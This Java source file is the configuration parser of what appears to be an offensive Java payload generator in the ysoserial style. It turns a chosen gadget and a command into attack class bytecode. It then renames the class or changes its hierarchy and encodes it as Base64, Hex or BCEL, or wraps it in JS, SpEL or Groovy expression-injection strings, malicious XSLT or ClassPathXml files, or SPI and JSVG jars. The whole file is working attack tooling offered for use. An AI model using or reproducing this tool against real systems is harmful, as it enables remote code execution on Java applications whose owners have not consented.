package cn.butler.thirdparty.config;

import cn.butler.payloads.ObjectPayload;
import cn.butler.payloads.config.Config;
import cn.butler.thirdparty.payloads.custom.ClassHandleUtil;
import cn.butler.thirdparty.payloads.custom.FileHandleUtil;
import cn.butler.thirdparty.payloads.expression.GroovyExpression;
import cn.butler.utils.FileUtils;
import me.gv7.woodpecker.bcel.HackBCELs;
import cn.butler.thirdparty.payloads.JarHandle.JarPayload;
import cn.butler.thirdparty.payloads.expression.JSExpression;
import cn.butler.thirdparty.payloads.expression.SpelExpression;
import org.apache.commons.cli.CommandLine;
import org.apache.commons.codec.binary.Hex;
import org.apache.shiro.lang.codec.Base64;

import javax.script.ScriptEngineFactory;

public class ThirdPartyConfig extends Config {
    @Override
    public void parse(CommandLine cmdLine) {
        final String payloadType = cmdLine.getOptionValue("gadget");
        final String command = cmdLine.getOptionValue("args");

        final Class<? extends ObjectPayload> payloadClass = ObjectPayload.Utils.getPayloadClass("ThirdPartyAttack",payloadType);
        if (payloadClass == null) {
            System.err.println("Invalid payload type '" + payloadType + "'");
            System.exit(USAGE_CODE);
            return; // make null analysis happy
        }

        try {
            ObjectPayload payload = payloadClass.newInstance();
            Object[] object = (Object[]) payload.getObject(command);
            String classByteName = (String) object[0];
            byte[] classByteCode = (byte[]) object[1];

            //给生成的字节码设置类名
            if(cmdLine.hasOption("className")){
                String newClassName = cmdLine.getOptionValue("className");
                object = (Object[]) ClassHandleUtil.setClassNameForClass(classByteName,classByteCode,newClassName);
                classByteName = (String) object[0];
                classByteCode = (byte[]) object[1];
            }

            //给生成的字节码类设置父类
            if(cmdLine.hasOption("superClassName")){
                String superClassName = cmdLine.getOptionValue("superClassName");
                object = (Object[]) ClassHandleUtil.setSuperClassForClass(classByteName,classByteCode,superClassName);
                classByteName = (String) object[0];
                classByteCode = (byte[]) object[1];
            }

            //给生成的字节码类设置接口
            if(cmdLine.hasOption("interfaceName")){
                String interfaceName = cmdLine.getOptionValue("interfaceName");
                object = (Object[]) ClassHandleUtil.addInterfaceForClass(classByteName,classByteCode,interfaceName);
                classByteName = (String) object[0];
                classByteCode = (byte[]) object[1];
            }

            if(cmdLine.hasOption("classModify")){
                String classModify = cmdLine.getOptionValue("classModify");
                if(classModify.equals("JavaWrapper")){
                    object = (Object[]) ClassHandleUtil.modifyJavaWrapperClass(classByteName,classByteCode);
                    classByteName = (String) object[0];
                    classByteCode = (byte[]) object[1];
                }
            }

            //序列化外包装处理: 编码/写入文件
            if(cmdLine.hasOption("encode")) {
                String encodeResult = "Currently only supports Base64,Hex,BCEL,JS encoding";
                String encodeType = cmdLine.getOptionValue("encode");
                if(encodeType.equals("Base64")){
                    encodeResult = Base64.encodeToString(classByteCode);
                } else if (encodeType.equals("Hex")) {
                    encodeResult = Hex.encodeHexString(classByteCode).toUpperCase();
                } else if (encodeType.equals("BCEL")) {
                    encodeResult = HackBCELs.encode(classByteCode);
                } else if (encodeType.equals("JS-JavaCode")){
                    encodeResult = JSExpression.commonExpressModify(classByteCode);
                } else if (encodeType.equals("JS-defineAnonymousClass-JavaCode")){
                    encodeResult = JSExpression.unsafeExpressModify(classByteCode);
                } else if(encodeType.equals("SPEL-JSCode-JavaCode")){
                    String jsJavaCode = JSExpression.commonExpressModify(classByteCode);
                    encodeResult = SpelExpression.expressModify(jsJavaCode);
                } else if(encodeType.equals("Groovy-JavaCode-UtilBase64")){
                    encodeResult = GroovyExpression.groovyShellExpressModifyUtilBase64(classByteCode);
                } else if (encodeType.equals("Groovy-JavaCode-MiscBase64")){
                    encodeResult = GroovyExpression.groovyShellExpressModifyMiscBase64(classByteCode);
                } else if (encodeType.equals("Groovy-JSCode-JavaCode")) {
                    encodeResult = GroovyExpression.groovyShellExpressModifyByJSCode(classByteCode);
                }
                if (cmdLine.hasOption("writeToFile")){
                    String fileName = cmdLine.getOptionValue("writeToFile");
                    FileUtils.savePayloadToFile(encodeResult,fileName);
                    System.exit(0);
                }
                System.out.println(encodeResult);
                System.exit(0);
            }

            //对字节码进行FileModify处理
            if(cmdLine.hasOption("fileModify")) {
                String fileModifyResult = "Currently only supports XSTL file Modify";
                String fileModifyType = cmdLine.getOptionValue("fileModify");
                if(fileModifyType.equals("XSTL")){
                    fileModifyResult = FileHandleUtil.XSTLModilfyClass(classByteName,classByteCode);
                } else if (fileModifyType.equals("ClassPathXml")) {
                    fileModifyResult = FileHandleUtil.ClassPathXmlModilfyClass(classByteName,classByteCode);
                }
                if (cmdLine.hasOption("writeToFile")){
                    String fileName = cmdLine.getOptionValue("writeToFile");
                    FileUtils.savePayloadToFile(fileModifyResult,fileName);
                    System.exit(0);
                }
                System.out.println(fileModifyResult);
                System.exit(0);
            }

            //Jar Payload输出
            if(cmdLine.hasOption("jarPayload")){
                String jarPayload = cmdLine.getOptionValue("jarPayload");
                byte[] classJarPayload = null;
                if (jarPayload.equals("ScriptEngineFactory")){
                    classByteCode = (byte[])object[1];
                    classJarPayload = JarPayload.createWithSPI(classByteName, classByteCode);
                } else if (jarPayload.equals("JSVGJar")){
                    classByteCode = (byte[])object[1];
                    classJarPayload = JarPayload.createWithJSVG(classByteName, classByteCode);
                } else if (jarPayload.equals("CommonJar")) {
                    classJarPayload = JarPayload.create(classByteName,classByteCode);
                }
                if (cmdLine.hasOption("writeToFile")){
                    String fileName = cmdLine.getOptionValue("writeToFile") + classByteName + ".jar";
                    FileUtils.saveBytePayloadToFile(classJarPayload,fileName);
                    System.exit(0);
                }
                System.out.println("Error ommand,must has filePath.");
                System.exit(0);
            }

            //写入到指定目录下
            if(cmdLine.hasOption("writeToFile")){
                String fileName = cmdLine.getOptionValue("writeToFile") + classByteName + ".class";
                FileUtils.saveBytePayloadToFile((byte[]) object[1],fileName);
                System.exit(0);
            }
            //原版的输出
            System.out.println(object);
            System.exit(0);
        } catch (Throwable e) {
            System.err.println("Error while generating or serializing payload");
            e.printStackTrace();
            System.exit(INTERNAL_ERROR_CODE);
        }
        System.exit(0);
    }
}
